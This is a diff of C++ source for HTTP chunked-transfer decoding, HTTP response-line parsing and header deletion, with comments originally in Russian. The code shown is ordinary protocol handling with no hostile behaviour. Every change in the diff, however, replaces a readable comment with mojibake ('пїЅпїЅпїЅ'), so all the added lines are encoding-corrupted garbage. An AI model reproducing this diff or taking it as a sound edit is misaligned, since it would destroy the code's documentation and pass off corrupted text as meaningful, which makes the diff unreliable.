+//  Chunks - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //*****************************************************************************
 
 
 PChunks Chunks::Initialize(PCHAR HTTPResponse)
 {
-	// Функция проверяет заголовок ответа и в случае если
-	// если значение заголовка Transfer-Encoding = chunked
-	// создаёт структуру для работы с загружаемыми данными
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Transfer-Encoding = chunked
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(HTTPResponse))
 		return NULL;
 	PCHAR Value = HTTPParser::GetHeaderValue(HTTPResponse, ParamTransferEncoding);
@@ -1473,18 +1484,18 @@ PChunks Chunks::Initialize(PCHAR HTTPResponse)
 
 LPBYTE Chunks::GetChunkSize(LPBYTE Buf, DWORD BufSize, DWORD &Size)
 {
-	// Функция возвращает размер блока
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	const static PCHAR EndChunk = "\r\n0\r\n\r\n";
 	const static DWORD EndChunkSize = 7;
 
 	Size = 0;
 
-	// проверяем на окончание данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (StrSame((PCHAR)Buf, EndChunk, true, EndChunkSize))
         return Buf + EndChunkSize;
 
-	// Полуяаем размер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (*Buf == 10 || *Buf == 13)
     	Buf = (LPBYTE)STR::GotoNextLine((PCHAR)Buf, BufSize);
 
@@ -1499,7 +1510,7 @@ LPBYTE Chunks::GetChunkSize(LPBYTE Buf, DWORD BufSize, DWORD &Size)
 
 void Chunks::HandleDataBlock(PChunks Chunks, LPBYTE Data, DWORD &Size)
 {
-	// Обработать блок данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Chunks == NULL || Data == NULL || Size == 0)
 		return;
 
@@ -1507,15 +1518,15 @@ void Chunks::HandleDataBlock(PChunks Chunks, LPBYTE Data, DWORD &Size)
 	LPBYTE Buf = Data;
 	while (Sz > 0 && !Chunks->Completed)
 	{
-		// Получаем размер блока
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (Chunks->Size == 0)
 		{
-            // Получаем размер части
+            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			LPBYTE SzEnd = GetChunkSize(Buf, Sz, Chunks->Size);
 			if (SzEnd != NULL)
 			{
 				DWORD HeadSize = SzEnd - Buf;
-				// Удаляем информацию о размере из буфера
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
                 STR::Delete((PCHAR)Buf, 0, HeadSize, Sz);
 
 				Sz -= HeadSize;
@@ -1529,14 +1540,14 @@ void Chunks::HandleDataBlock(PChunks Chunks, LPBYTE Data, DWORD &Size)
             }
 		}
 
-		// Пропускаем блок
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		DWORD NeedRead = Chunks->Size - Chunks->Readed;
 		if ( NeedRead <= Sz)
 		{
 			Chunks->Readed += NeedRead;
 			Sz -= NeedRead;
 			Buf += NeedRead;
-			// Блок полностью прочитан
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if (Chunks->Readed == Chunks->Size)
 			{
 				Chunks->Readed = 0;
@@ -1545,7 +1556,7 @@ void Chunks::HandleDataBlock(PChunks Chunks, LPBYTE Data, DWORD &Size)
 		}
 		else
 		{
-			// блок данных содержит не весь передаваймый кусок
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			Chunks->Readed += Sz;
 			break;
         }
@@ -1558,7 +1569,7 @@ void Chunks::HandleDataBlock(PChunks Chunks, LPBYTE Data, DWORD &Size)
 
 void Chunks::Free(PChunks Chunks)
 {
-	// Функция уничтожает структуру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Chunks != NULL)
     	FreeStruct(Chunks);
 }
@@ -1567,12 +1578,12 @@ void Chunks::Free(PChunks Chunks)
 //---------------------------------------------------------------------------
 
 //*****************************************************************************
-//  HTTPParser - Парсер HTTP данных
+//  HTTPParser - пїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅ
 //*****************************************************************************
 bool HTTPParser::ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHAR &StatusLine)
 {
-	// парсим строку ответа HTTP сервера
-	// Например HTTP/1.1 200 Ok
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP/1.1 200 Ok
 	Protocol = NULL;
 	Code = 0;
 	StatusLine = NULL;
@@ -1585,13 +1596,13 @@ bool HTTPParser::ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHA
 	PCHAR Start = Buf;
 	PCHAR End = Start;
 
-	// Определяем протокол
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	End = ScanLN(Buf, ' ');
 	if (End == NULL)
 		return false;
 	Protocol = STR::New(Start, End - Start);
 
-	// Определяем код
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	Start = End;
 	IgnoreSpaces(Start);
 	End = ScanLN(Start, ' ');
@@ -1599,7 +1610,7 @@ bool HTTPParser::ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHA
     Code = (DWORD)StrToInt(Tmp);
 	STR::Free(Tmp);
 
-	// Определяем строку ответа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Start = End;
 	IgnoreSpaces(Start);
 	End = STR::End(Start);
@@ -1611,11 +1622,11 @@ bool HTTPParser::ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHA
 //---------------------------------------------------------------------------
 
 //*****************************************************************************
-// Методы для работы с HTTP данными
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //*****************************************************************************
 PCHAR HTTPUtils::DeleteHeaderValue(PCHAR Buf, int &Size, PCHAR Header)
 {
-	// Функция указанный HTTP заголовок
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Buf) || STR::IsEmpty(Header)) return Buf;
 	if (Size == 0)
 		Size = StrCalcLength(Buf);
@@ -1628,7 +1639,7 @@ PCHAR HTTPUtils::DeleteHeaderValue(PCHAR Buf, int &Size, PCHAR Header)
 		
 	PCHAR End = Start;
 
-	// Переходим на следующую строку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	while (*End != 0 && *End != 10 && *End != 13) End++;
 
 	DWORD Delta = End - Start;
